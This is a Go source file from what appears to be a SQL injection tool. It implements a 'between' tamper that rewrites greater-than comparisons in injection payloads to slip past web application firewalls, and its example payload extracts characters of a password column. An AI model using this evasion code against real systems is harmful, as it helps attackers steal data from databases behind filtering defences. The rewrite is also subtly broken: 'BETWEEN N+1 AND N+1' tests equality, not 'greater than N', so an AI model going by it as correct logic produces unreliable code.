package tamper

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
)

// greaterThanPattern matches "expr>N" where N is an integer literal.
// Uses [^>]+ to correctly handle nested parentheses in expr
// (e.g. ASCII(SUBSTRING(col,1,1))>64).
var greaterThanPattern = regexp.MustCompile(`([^>]+)>\s*(\d+)`)

// betweenTamper replaces "expr > N" with "expr BETWEEN N+1 AND N+1" to bypass
// WAFs that block the > operator in SQL injection payloads.
//
// This tamper is most useful for boolean-blind and time-based binary searches
// that use ASCII(SUBSTRING(...)) > N comparisons.
//
// Example:
//
//	"ASCII(SUBSTRING(password,1,1))>64" → "ASCII(SUBSTRING(password,1,1)) BETWEEN 65 AND 65"
type betweenTamper struct{}

func (t *betweenTamper) Name() string { return "between" }

func (t *betweenTamper) Apply(s string) string {
	return greaterThanPattern.ReplaceAllStringFunc(s, func(match string) string {
		sub := greaterThanPattern.FindStringSubmatch(match)
		if len(sub) < 3 {
			return match
		}
		expr := strings.TrimSpace(sub[1])
		n, err := strconv.Atoi(strings.TrimSpace(sub[2]))
		if err != nil {
			return match
		}
		// expr > N  →  expr BETWEEN N+1 AND N+1
		return fmt.Sprintf("%s BETWEEN %d AND %d", expr, n+1, n+1)
	})
}
